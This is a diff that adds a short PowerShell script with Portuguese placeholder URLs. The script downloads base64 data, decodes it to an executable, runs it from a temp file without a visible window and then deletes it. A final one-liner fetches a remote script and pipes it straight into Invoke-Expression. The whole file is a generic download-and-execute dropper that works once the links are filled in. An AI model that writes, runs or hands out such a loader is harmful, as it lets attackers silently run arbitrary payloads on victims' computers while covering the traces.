@@ -1,0 +1,10 @@
+$base64Url = "LINK RAW AQUI!"
+$tempPath = [System.IO.Path]::GetTempFileName()
+
+$base64Data = Invoke-WebRequest -Uri $base64Url -UseBasicParsing | Select-Object -ExpandProperty Content
+$binaryData = [System.Convert]::FromBase64String($base64Data)
+[System.IO.File]::WriteAllBytes($tempPath, $binaryData)
+Start-Process -FilePath $tempPath -NoNewWindow -Wait
+Remove-Item $tempPath -Force
+
+iwr -useb LINK DO RAW PS1 AQUI! | iex
